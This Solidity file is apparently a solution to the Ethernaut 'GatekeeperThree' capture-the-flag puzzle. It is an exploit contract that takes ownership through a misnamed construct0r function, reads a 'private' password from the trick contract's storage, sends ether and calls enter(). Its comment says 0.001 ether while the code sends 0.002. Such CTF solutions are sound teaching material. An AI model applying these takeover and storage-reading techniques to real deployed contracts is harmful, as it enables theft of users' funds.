// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/GatekeeperThree/GatekeeperThree.sol";
import "../BlockUtils.sol";

contract GatekeeperThreeExploit is BlockUtils {
    GatekeeperThree victim;
    
    constructor(address _victim) {
        victim = GatekeeperThree(payable(_victim));



    }

    function hack() public {
        victim.construct0r();

        require(victim.owner() == address(this), "Owner should be this contract");

        victim.createTrick();


        SimpleTrick trick = victim.trick();
        uint password = uint256(peekStorage(address(trick), 2));
        victim.getAllowance(password);

        require(victim.allowEntrance(), "Entrance should be allowed by now");

        // send victim 0.001 ether
        address(victim).call{value: 0.002 ether}("");
    
        
        victim.enter();

    }

    
}